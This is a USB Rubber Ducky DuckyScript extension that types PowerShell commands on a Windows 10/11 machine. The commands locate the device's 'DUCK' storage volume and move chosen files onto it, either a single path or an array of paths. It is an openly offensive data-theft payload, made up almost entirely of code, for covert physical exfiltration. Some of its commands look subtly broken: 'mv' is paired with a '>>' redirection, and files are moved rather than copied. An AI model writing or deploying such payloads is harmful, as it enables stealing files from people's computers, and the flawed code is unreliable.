EXTENSION SAVE_FILES_IN_RUBBER_DUCKY_STORAGE-Windows
    REM VERSION 1.0
    REM AUTHOR: Aleff

    REM_BLOCK Documentation
        This extension is used to save one or more files through the USB Rubber Ducky storage.

        TARGET:
            Windows 10/11

        USAGE:
            Insert this extension when you have one or more files that you want to save in your USB Rubber Ducky.


        CONFIGURATION:
            Set #FLAG-SINGLE-FILE with TRUE if you want to save just one file.
            In this case you will need to specify the file path within the #SINGLE-PATH variable OR, in case the exact path to the file you can only acquire it at runtime and so via the powershell, use in the powershell the $fileToSavePath variable to capture this path.
                i.e. in DuckyScript EXTENSION
                    DEFINE #SINGLE-PATH C:\Users\Aleff\Downloads\photo.png
                i.e. in PowerShell before extension
                    $fileToSavePath = "C:\Users\Aleff\Downloads\photo.png"

            Set #FLAG-SINGLE-FILE FALSE if you want to send multiple files.
            In this case in the PowerShell you will have to create the variable $fileToSavePaths, which is an array of strings that should contain the list of paths related to the files you want to save.
                i.e. in PowerShell before extension:
                    $fileToSavePaths = @(
                        "C:\Users\Aleff\Downloads\photo.png",
                        "C:\Users\Aleff\Downloads\document.pdf",
                        "C:\Users\Aleff\Downloads\song.mp3"
                    )
                Some tips:
                    How to create an Array?
                        > $fileToSavePaths = @()
                    How to add an element?
                        > $fileToSavePaths += "C:\Users\Aleff\Downloads\photo.png"
                    How to see the array?
                        > $fileToSavePaths


    END_REM


    REM Settings
    DEFINE #FLAG-SINGLE-FILE FALSE
    DEFINE #SINGLE-PATH 0

    REM Extension Code
    FUNCTION SAVE-SINGLE-FILE()

        IF ( #SINGLE-PATH != 0 ) THEN

            STRINGLN mv #SINGLE-PATH >> ${m}:\
            
        ELSE IF ( #SINGLE-PATH == 0 ) THEN
        
            STRINGLN mv ${fileToSavePath} >> ${m}:\

        END_IF

    END_FUNCTION

    FUNCTION SAVE-MULTIPLE-FILES()
        
        STRINGLN
            foreach ($fileToSavePath in $fileToSavePaths) {
                mv ${fileToSavePath} >> ${m}:\
            }
        END_STRINGLN

    END_FUNCTION

    STRINGLN $m=(Get-Volume -FileSystemLabel 'DUCK').DriveLetter;
    
    IF_DEFINED_TRUE #FLAG-SINGLE-FILE
        SAVE-SINGLE-FILE()
    END_IF_DEFINED

    IF_NOT_DEFINED_TRUE #FLAG-SINGLE-FILE
        SAVE-MULTIPLE-FILES()
    END_IF_DEFINED
    
END_EXTENSION
